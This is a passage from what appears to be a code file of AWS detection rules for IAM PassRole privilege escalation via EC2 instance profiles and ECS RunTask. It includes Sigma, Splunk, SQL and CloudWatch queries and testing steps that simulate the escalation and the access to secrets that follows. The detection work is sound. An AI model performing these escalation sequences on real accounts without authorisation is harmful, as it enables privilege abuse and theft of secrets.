      - 'BreakGlass'
  condition: selection and filter_name
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=RunInstances
| where isnotnull(requestParameters.iamInstanceProfile)
| where like(requestParameters.iamInstanceProfile, "%Admin%") OR like(requestParameters.iamInstanceProfile, "%PowerUser%") OR like(requestParameters.iamInstanceProfile, "%Security%") OR like(requestParameters.iamInstanceProfile, "%BreakGlass%") OR like(requestParameters.iamInstanceProfile, "%Administrator%")
| table _time, userIdentity.arn, eventName, requestParameters.iamInstanceProfile`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.iamInstanceProfile, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'RunInstances'
  AND requestParameters.iamInstanceProfile IS NOT NULL
  AND (requestParameters.iamInstanceProfile LIKE '%Admin%' OR requestParameters.iamInstanceProfile LIKE '%PowerUser%' OR requestParameters.iamInstanceProfile LIKE '%Security%' OR requestParameters.iamInstanceProfile LIKE '%BreakGlass%' OR requestParameters.iamInstanceProfile LIKE '%Administrator%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.iamInstanceProfile
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "RunInstances"
| filter requestParameters.iamInstanceProfile like /Admin|PowerUser|Security|BreakGlass|Administrator/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunInstances"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.iamInstanceProfile", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "RunInstances", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { iamInstanceProfile: { name: "AdminInstanceProfile" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the instance profile and its attached role.", "Verify if the profile has privileged permissions.", "Check if the launch was from deployment automation."],
    testingSteps: ["Launch EC2 with Admin instance profile.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-067",
    title: "Suspicious EC2 Launch with IAM Profile by Unexpected Actor",
    description: "Detects compute launch with IAM profile by an identity that should not be launching privileged EC2. Suspicious actors include IAM users, non-admin app roles, identities outside deployment automation. Excludes Terraform, CloudFormation, and admin roles.",
    awsService: "EC2",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["EC2", "RunInstances", "PassRole", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate deployment automation", "CI/CD pipelines"],
    rules: {
      sigma: `title: Suspicious EC2 Launch with IAM Profile by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
  filter_profile:
    requestParameters.iamInstanceProfile|exists: true
  filter_known:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'codepipeline'
      - 'codebuild'
  condition: selection and filter_profile and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com eventName=RunInstances
| where isnotnull(requestParameters.iamInstanceProfile)
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%codepipeline%") OR like(userIdentity.arn, "%codebuild%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.iamInstanceProfile`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.iamInstanceProfile, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName = 'RunInstances'
  AND requestParameters.iamInstanceProfile IS NOT NULL
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%codepipeline%'
  AND userIdentity.arn NOT LIKE '%codebuild%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.iamInstanceProfile
| filter eventSource = "ec2.amazonaws.com"
| filter eventName = "RunInstances"
| filter ispresent(requestParameters.iamInstanceProfile)
| filter userIdentity.principalId not like /terraform|cloudformation|admin|codepipeline|codebuild/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunInstances"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.iamInstanceProfile", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "RunInstances", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { iamInstanceProfile: { name: "AdminInstanceProfile" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized to launch EC2 with instance profiles.", "Check sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["As a non-admin role, launch EC2 with instance profile.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-068",
    title: "EC2 Instance Profile Associated or Replaced",
    description: "Visibility for AssociateIamInstanceProfile and ReplaceIamInstanceProfileAssociation. Attackers may add or swap a profile on an existing instance rather than launch a new one.",
    awsService: "EC2",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["EC2", "Instance Profile", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate instance profile association", "Auto Scaling replacement"],
    rules: {
      sigma: `title: EC2 Instance Profile Associated or Replaced
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ec2.amazonaws.com
    eventName:
      - AssociateIamInstanceProfile
      - ReplaceIamInstanceProfileAssociation
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ec2.amazonaws.com (eventName=AssociateIamInstanceProfile OR eventName=ReplaceIamInstanceProfileAssociation)
| table _time, userIdentity.arn, eventName, requestParameters.instanceId, requestParameters.iamInstanceProfile, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.instanceId, requestParameters.iamInstanceProfile, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ec2.amazonaws.com'
  AND eventName IN ('AssociateIamInstanceProfile', 'ReplaceIamInstanceProfileAssociation')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.instanceId, requestParameters.iamInstanceProfile, sourceIPAddress
| filter eventSource = "ec2.amazonaws.com"
| filter eventName in ["AssociateIamInstanceProfile", "ReplaceIamInstanceProfileAssociation"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["AssociateIamInstanceProfile", "ReplaceIamInstanceProfileAssociation"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.instanceId", "requestParameters.iamInstanceProfile", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "AssociateIamInstanceProfile", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { instanceId: "i-xxx", iamInstanceProfile: { name: "AdminProfile" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who associated or replaced the profile.", "Verify the target instance and new profile.", "Check if the change was authorized."],
    testingSteps: ["Call AssociateIamInstanceProfile on an instance.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-069",
    title: "RunInstances with IAM Profile Followed by Privileged API Use",
    description: "High-confidence escalation: RunInstances with instance profile then shortly afterward, activity from the role associated with that profile performs AssumeRole, GetSecretValue, s3:GetObject, kms:Decrypt, iam:AttachRolePolicy, ec2:CreateSnapshot. Models post-launch abuse of the passed role.",
    awsService: "EC2",
    relatedServices: ["IAM", "STS", "Secrets Manager", "S3", "KMS"],
    severity: "Critical",
    tags: ["EC2", "RunInstances", "PassRole", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate EC2 launch followed by normal workload activity"],
    rules: {
      sigma: `title: RunInstances with IAM Profile Followed by Privileged API Use
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_launch:
    eventSource: ec2.amazonaws.com
    eventName: RunInstances
  selection_sensitive:
    eventName:
      - AssumeRole
      - GetSecretValue
      - CreateSnapshot
      - AttachRolePolicy
      - PutRolePolicy
  condition: 1 of selection_*
level: critical
# Full correlation (instance role, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ec2.amazonaws.com AND eventName=RunInstances) OR (eventName=AssumeRole OR eventName=GetSecretValue OR eventName=CreateSnapshot OR eventName=AttachRolePolicy OR eventName=PutRolePolicy))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_launch=if(eventSource="ec2.amazonaws.com" AND eventName="RunInstances" AND isnotnull(requestParameters.iamInstanceProfile), 1, 0)
| eval is_sensitive=if(eventName IN ("AssumeRole","GetSecretValue","CreateSnapshot","AttachRolePolicy","PutRolePolicy"), 1, 0)
| transaction actor maxspan=15m
| where mvcount(mvfilter(is_launch=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.iamInstanceProfile`,
      cloudtrail: `WITH ec2_launch AS (
  SELECT userIdentity.arn AS actor, eventTime AS launch_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ec2.amazonaws.com'
    AND eventName = 'RunInstances'
    AND requestParameters.iamInstanceProfile IS NOT NULL
),
sensitive_use AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('AssumeRole', 'GetSecretValue', 'CreateSnapshot', 'AttachRolePolicy', 'PutRolePolicy')
)
SELECT e.actor, e.launch_time, s.use_time, s.eventName
FROM ec2_launch e
JOIN sensitive_use s ON e.actor = s.actor
  AND s.use_time > e.launch_time
  AND s.use_time <= e.launch_time + INTERVAL '15' MINUTE
ORDER BY e.launch_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.iamInstanceProfile
| filter (eventSource = "ec2.amazonaws.com" and eventName = "RunInstances" and ispresent(requestParameters.iamInstanceProfile))
  or eventName in ["AssumeRole", "GetSecretValue", "CreateSnapshot", "AttachRolePolicy", "PutRolePolicy"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ec2"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunInstances"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ec2.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.iamInstanceProfile", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ec2.amazonaws.com", eventName: "RunInstances", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { iamInstanceProfile: { name: "AdminInstanceProfile" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor that launched the instance.", "Review the sequence: RunInstances → sensitive API use within 15 minutes.", "Verify if the instance role was used for expected workload.", "Check for credential exfiltration indicators."],
    testingSteps: ["Launch EC2 with instance profile, then use the role for GetSecretValue within 15 min.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- PassRole via ECS RunTask (detect via ECS, NOT iam:PassRole) ---
  {
    id: "det-070",
    title: "ECS RunTask Executed",
    description: "Baseline visibility for ad hoc task execution. RunTask can be legitimate but ad hoc task launches are often sensitive because they can run attacker-controlled code.",
    awsService: "ECS",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["ECS", "RunTask", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate ECS task execution", "Scheduled tasks", "CI/CD"],
    rules: {
      sigma: `title: ECS RunTask Executed
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ecs.amazonaws.com
    eventName: RunTask
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ecs.amazonaws.com eventName=RunTask
| table _time, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ecs.amazonaws.com'
  AND eventName = 'RunTask'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides, sourceIPAddress
| filter eventSource = "ecs.amazonaws.com"
| filter eventName = "RunTask"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ecs"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunTask"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ecs.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.cluster", "requestParameters.taskDefinition", "requestParameters.overrides", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ecs.amazonaws.com", eventName: "RunTask", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { cluster: "prod", taskDefinition: "backdoor-task:1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who ran the task.", "Inspect the task definition and overrides.", "Verify if the task execution was authorized."],
    testingSteps: ["Call ECS RunTask.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-071",
    title: "RunTask with Privileged Task Role",
    description: "Detects likely privilege escalation when the task uses a high-risk task role. Flags task definitions or overrides.taskRoleArn containing Admin, PowerUser, Security, BreakGlass, or AdministratorAccess.",
    awsService: "ECS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["ECS", "RunTask", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known service/task definitions", "Approved operational automation"],
    rules: {
      sigma: `title: RunTask with Privileged Task Role
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ecs.amazonaws.com
    eventName: RunTask
  filter_task:
    requestParameters.taskDefinition|contains:
      - 'admin'
      - 'Admin'
      - 'PowerUser'
      - 'Security'
      - 'BreakGlass'
      - 'backdoor'
  filter_override:
    requestParameters.overrides|contains:
      - 'taskRoleArn'
      - 'Admin'
      - 'PowerUser'
  condition: selection and (filter_task or filter_override)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ecs.amazonaws.com eventName=RunTask
| where like(requestParameters.taskDefinition, "%admin%") OR like(requestParameters.taskDefinition, "%Admin%") OR like(requestParameters.taskDefinition, "%PowerUser%") OR like(requestParameters.taskDefinition, "%Security%") OR like(requestParameters.taskDefinition, "%BreakGlass%") OR like(requestParameters.taskDefinition, "%backdoor%") OR like(requestParameters.overrides, "%taskRoleArn%")
| table _time, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides
FROM cloudtrail_logs
WHERE eventSource = 'ecs.amazonaws.com'
  AND eventName = 'RunTask'
  AND (requestParameters.taskDefinition LIKE '%admin%' OR requestParameters.taskDefinition LIKE '%Admin%' OR requestParameters.taskDefinition LIKE '%PowerUser%' OR requestParameters.taskDefinition LIKE '%Security%' OR requestParameters.taskDefinition LIKE '%BreakGlass%' OR requestParameters.taskDefinition LIKE '%backdoor%' OR requestParameters.overrides LIKE '%taskRoleArn%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides
| filter eventSource = "ecs.amazonaws.com"
| filter eventName = "RunTask"
| filter requestParameters.taskDefinition like /admin|PowerUser|Security|BreakGlass|backdoor/i or requestParameters.overrides like /taskRoleArn/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ecs"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunTask"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ecs.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.taskDefinition", "requestParameters.overrides", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ecs.amazonaws.com", eventName: "RunTask", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { cluster: "prod", taskDefinition: "admin-task:1", overrides: { taskRoleArn: "arn:aws:iam::123456789012:role/AdminRole" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the task definition and task role.", "Verify if the task role has privileged permissions.", "Check if the task execution was from approved automation."],
    testingSteps: ["Run a task with admin in the task definition name.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-072",
    title: "RunTask with Task Role Override",
    description: "Detects unusual task launches when taskRoleArn override is present. Override indicates the task role was explicitly specified at runtime, which is a strong signal for PassRole abuse.",
    awsService: "ECS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["ECS", "RunTask", "PassRole", "Privilege Escalation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate task role override for testing", "Multi-role task definitions"],
    rules: {
      sigma: `title: RunTask with Task Role Override
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ecs.amazonaws.com
    eventName: RunTask
  filter_override:
    requestParameters.overrides|contains: 'taskRoleArn'
  condition: selection and filter_override
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ecs.amazonaws.com eventName=RunTask
| where like(requestParameters.overrides, "%taskRoleArn%")
| table _time, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides
FROM cloudtrail_logs
WHERE eventSource = 'ecs.amazonaws.com'
  AND eventName = 'RunTask'
  AND requestParameters.overrides IS NOT NULL
  AND requestParameters.overrides LIKE '%taskRoleArn%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, requestParameters.overrides
| filter eventSource = "ecs.amazonaws.com"
| filter eventName = "RunTask"
| filter requestParameters.overrides like /taskRoleArn/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ecs"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunTask"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ecs.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.overrides", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ecs.amazonaws.com", eventName: "RunTask", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { cluster: "prod", taskDefinition: "my-task:1", overrides: { taskRoleArn: "arn:aws:iam::123456789012:role/AdminRole" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the overridden task role ARN.", "Verify if the override was authorized.", "Check the task definition's default role vs override."],
    testingSteps: ["Run a task with taskRoleArn in overrides.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],
  },
  {
    id: "det-073",
    title: "RunTask by Unexpected Actor",
    description: "Detects ECS task launches by identities that normally should not run tasks with roles. Suspicious actors include IAM users, application roles outside CI/CD or platform automation, non-admin assumed roles. Excludes Terraform, CloudFormation, codepipeline, codebuild.",
    awsService: "ECS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["ECS", "RunTask", "PassRole", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate CI/CD or platform automation", "ECS console operations"],
    rules: {
      sigma: `title: RunTask by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ecs.amazonaws.com
    eventName: RunTask
  filter_known:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
      - 'admin'
      - 'Admin'
      - 'codepipeline'
      - 'codebuild'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ecs.amazonaws.com eventName=RunTask
| where NOT (like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%") OR like(userIdentity.arn, "%admin%") OR like(userIdentity.arn, "%Admin%") OR like(userIdentity.arn, "%codepipeline%") OR like(userIdentity.arn, "%codebuild%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ecs.amazonaws.com'
  AND eventName = 'RunTask'
  AND userIdentity.principalId NOT LIKE '%terraform%'
  AND userIdentity.principalId NOT LIKE '%cloudformation%'
  AND userIdentity.arn NOT LIKE '%admin%'
  AND userIdentity.arn NOT LIKE '%Admin%'
  AND userIdentity.arn NOT LIKE '%codepipeline%'
  AND userIdentity.arn NOT LIKE '%codebuild%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.cluster, requestParameters.taskDefinition
| filter eventSource = "ecs.amazonaws.com"
| filter eventName = "RunTask"
| filter userIdentity.principalId not like /terraform|cloudformation|admin|codepipeline|codebuild/i
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ecs"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunTask"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ecs.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.cluster", "requestParameters.taskDefinition", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ecs.amazonaws.com", eventName: "RunTask", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { cluster: "prod", taskDefinition: "backdoor-task:1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized to run ECS tasks.", "Check sessionContext.sessionIssuer.arn for assumed roles."],
    testingSteps: ["As a non-admin role, call ECS RunTask.", "Verify CloudTrail captures the event.", "Run the detection to confirm it triggers on unexpected actors."],
  },
  {
    id: "det-074",
    title: "RunTask Followed by Sensitive Activity from Task Role",
    description: "High-confidence privilege escalation: RunTask using task role then shortly afterward, role performs AssumeRole, GetSecretValue, s3:GetObject, kms:Decrypt, iam:AttachRolePolicy, PutRolePolicy, ecs:RegisterTaskDefinition. Correlates ECS launch with follow-on activity by the same actor.",
    awsService: "ECS",
    relatedServices: ["IAM", "STS", "Secrets Manager", "S3", "KMS"],
    severity: "Critical",
    tags: ["ECS", "RunTask", "PassRole", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate task execution followed by normal workload API calls"],
    rules: {
      sigma: `title: RunTask Followed by Sensitive Activity from Task Role
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_run:
    eventSource: ecs.amazonaws.com
    eventName: RunTask
  selection_sensitive:
    eventName:
      - AssumeRole
      - GetSecretValue
      - AttachRolePolicy
      - PutRolePolicy
      - RegisterTaskDefinition
  condition: 1 of selection_*
level: critical
# Full correlation (task role, 15 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=ecs.amazonaws.com AND eventName=RunTask) OR (eventName=AssumeRole OR eventName=GetSecretValue OR eventName=AttachRolePolicy OR eventName=PutRolePolicy OR eventName=RegisterTaskDefinition))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_run=if(eventSource="ecs.amazonaws.com" AND eventName="RunTask", 1, 0)
| eval is_sensitive=if(eventName IN ("AssumeRole","GetSecretValue","AttachRolePolicy","PutRolePolicy","RegisterTaskDefinition"), 1, 0)
| transaction actor maxspan=15m
| where mvcount(mvfilter(is_run=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.taskDefinition`,
      cloudtrail: `WITH ecs_run AS (
  SELECT userIdentity.arn AS actor, eventTime AS run_time
  FROM cloudtrail_logs
  WHERE eventSource = 'ecs.amazonaws.com'
    AND eventName = 'RunTask'
),
sensitive_use AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('AssumeRole', 'GetSecretValue', 'AttachRolePolicy', 'PutRolePolicy', 'RegisterTaskDefinition')
)
SELECT e.actor, e.run_time, s.use_time, s.eventName
FROM ecs_run e
JOIN sensitive_use s ON e.actor = s.actor
  AND s.use_time > e.run_time
  AND s.use_time <= e.run_time + INTERVAL '15' MINUTE
ORDER BY e.run_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.taskDefinition
| filter (eventSource = "ecs.amazonaws.com" and eventName = "RunTask")
  or eventName in ["AssumeRole", "GetSecretValue", "AttachRolePolicy", "PutRolePolicy", "RegisterTaskDefinition"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.ecs"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["RunTask"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ecs.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.taskDefinition", "requestParameters.overrides", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ecs.amazonaws.com", eventName: "RunTask", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { cluster: "prod", taskDefinition: "backdoor-task:1" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor that ran the task.", "Review the sequence: RunTask → sensitive API use within 15 minutes.", "Verify if the task role was used for expected workload.", "Check for credential exfiltration from the container."],
    testingSteps: ["Run ECS task, then have the task role perform GetSecretValue within 15 min.", "Verify both events in CloudTrail.", "Run the Splunk or Athena correlation query."],
  },

  // --- SSM Session Manager Access ---
  {
    id: "det-075",
    title: "SSM StartSession Visibility",
    description: "Baseline visibility for any interactive Session Manager session. StartSession can be legitimate admin activity but is lateral-movement-relevant and should be tracked.",
    awsService: "SSM",
    relatedServices: ["EC2"],
    severity: "Medium",
    tags: ["SSM", "Session Manager", "Lateral Movement"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate admin troubleshooting", "Platform automation"],
    rules: {
      sigma: `title: SSM StartSession Visibility
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ssm.amazonaws.com
    eventName: StartSession
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ssm.amazonaws.com eventName=StartSession
